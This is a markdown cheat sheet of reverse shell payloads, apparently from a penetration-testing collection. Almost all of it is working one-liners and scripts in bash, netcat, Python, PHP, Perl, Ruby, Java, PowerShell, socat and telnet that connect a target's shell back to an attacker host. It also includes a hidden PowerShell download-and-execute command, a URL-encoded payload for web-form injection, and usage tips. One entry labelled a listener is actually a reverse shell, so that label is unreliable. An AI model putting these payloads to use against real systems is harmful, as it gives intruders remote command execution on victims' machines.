# 🐚 Reverse Shells Payload Collection

## What is a Reverse Shell?

A reverse shell is a shell session initiated from a target machine that connects back to an attacker's machine, giving the attacker interactive command execution.

---

## Listener Setup

```bash
# Netcat listener
nc -lvnp 4444

# Bash listener
bash -i >& /dev/tcp/attacker_ip/4444 0>&1

# Socat listener
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

---

## Reverse Shell Payloads

### Bash

```bash
bash -i >& /dev/tcp/10.0.0.5/4444 0>&1

bash -i >& /dev/tcp/attacker_ip/4444 0>&1 &

/bin/bash -i >& /dev/tcp/10.0.0.5/4444 0>&1
```

### Netcat

```bash
nc attacker_ip 4444 -e /bin/bash

nc -e /bin/sh attacker_ip 4444

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker_ip 4444 >/tmp/f
```

### Python

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.0.0.5",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
```

### Python (One-Liner)

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.0.0.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

### PHP

```php
<?php exec("/bin/bash -i >& /dev/tcp/10.0.0.5/4444 0>&1"); ?>
```

### PHP (One-Liner)

```bash
php -r '$sock=fsockopen("10.0.0.5",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Perl

```perl
perl -e 'use Socket;$i="10.0.0.5";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i")};'
```

### Ruby

```ruby
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.0.0.5",4444);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

### Java

```java
Runtime r = Runtime.getRuntime();
Process p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.5/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]);
p.waitFor();
```

### PowerShell

```powershell
$ip="10.0.0.5"
$port=4444
$client = New-Object System.Net.Sockets.TcpClient($ip,$port)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2  = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```

### PowerShell (One-Liner)

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-PSDrive -Name X -PSProvider Registry -Root HKLM:\Software; IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.5/shell.ps1')
```

### Socat

```bash
socat exec:"/bin/sh" tcp:10.0.0.5:4444
```

### Telnet

```bash
telnet attacker_ip 4444 | /bin/bash | telnet attacker_ip 4445
```

---

## URL-Encoded Payloads

For web shells and form submissions:

```
bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.0.5%2F4444%200%3E%261
```

---

## Tips

- Always use a listener first before executing payload
- Check if netcat, bash, python, or php is available
- Try different payloads if one fails
- URL-encode if injecting into web forms
- Use `-v` flag with nc listener for verbose output
- Test locally in a safe environment first

